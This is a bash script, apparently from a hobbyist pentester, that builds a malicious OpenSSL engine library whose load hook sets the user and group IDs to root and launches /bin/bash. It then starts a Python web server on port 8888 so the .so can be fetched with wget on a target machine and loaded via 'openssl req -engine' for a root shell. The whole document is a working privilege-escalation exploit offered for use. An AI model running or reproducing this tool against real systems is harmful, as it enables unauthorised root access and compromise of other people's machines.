#!/bin/bash

bold=$(tput bold)
underline=$(tput smul)

echo -e '\E[31;40m' "Made by OvergrownCarrot1, thanks for using"
echo -e '\E[31;40m' "Creating openssl-exploit-engine.c file"; tput sgr0
echo '#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()  ' >  openssl-exploit-engine.c

echo -e '\E[31;40m' "Compiling, do not worry about errors";tput sgr0
gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o

echo -e '\E[31;40m' "Starting web server"; tput sgr0
echo -e '\E[33;40m' "Do a wget on the remote machine to transfer ${bold}openssl-exploit-engine.so over once transferred
run ${underline}openssl req -engine ./openssl-exploit-engine.so"; tput sgr0
sleep 2
echo -e '\E[31;40m' "Started web server on port 8888";tput sgr0

python3 -m http.server 8888
